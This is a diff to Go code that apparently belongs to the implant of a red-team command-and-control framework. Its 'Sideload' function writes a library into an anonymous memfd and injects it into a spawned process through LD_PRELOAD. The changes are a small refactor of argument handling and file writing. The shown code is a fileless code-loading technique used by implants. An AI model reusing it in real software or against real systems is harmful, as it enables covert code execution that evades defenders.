@@ -21,10 +21,10 @@ package taskrunner
 import (
 	"bytes"
 	"fmt"
+	"io/ioutil"
 	"os"
 	"os/exec"
 	"runtime"
-	"strings"
 	"sync"
 	"syscall"
 	"unsafe"
@@ -56,7 +56,7 @@ func RemoteTask(processID int, data []byte, rwxPages bool) error {
 }
 
 // Sideload - Side load a library and return its output
-func Sideload(procName string, procArgs []string, _ uint32, data []byte, args []string, kill bool) (string, error) {
+func Sideload(procName string, procArgs []string, _ uint32, data []byte, args string, kill bool) (string, error) {
 	var (
 		nrMemfdCreate int
 		stdOut        bytes.Buffer
@@ -80,7 +80,7 @@ func Sideload(procName string, procArgs []string, _ uint32, data []byte, args []
 	fd, _, _ := syscall.Syscall(uintptr(nrMemfdCreate), uintptr(unsafe.Pointer(memfd)), 1, 0)
 	pid := os.Getpid()
 	fdPath := fmt.Sprintf("/proc/%d/fd/%d", pid, fd)
-	err = os.WriteFile(fdPath, data, 0755)
+	err = ioutil.WriteFile(fdPath, data, 0755)
 	if err != nil {
 		//{{if .Config.Debug}}
 		log.Printf("Error writing file to memfd: %s\n", err)
@@ -92,7 +92,7 @@ func Sideload(procName string, procArgs []string, _ uint32, data []byte, args []
 	//{{end}}
 	env := os.Environ()
 	newEnv := []string{
-		fmt.Sprintf("LD_PARAMS=%s", strings.Join(args, " ")),
+		fmt.Sprintf("LD_PARAMS=%s", args),
 		fmt.Sprintf("LD_PRELOAD=%s", fdPath),
 	}
 	env = append(env, newEnv...)
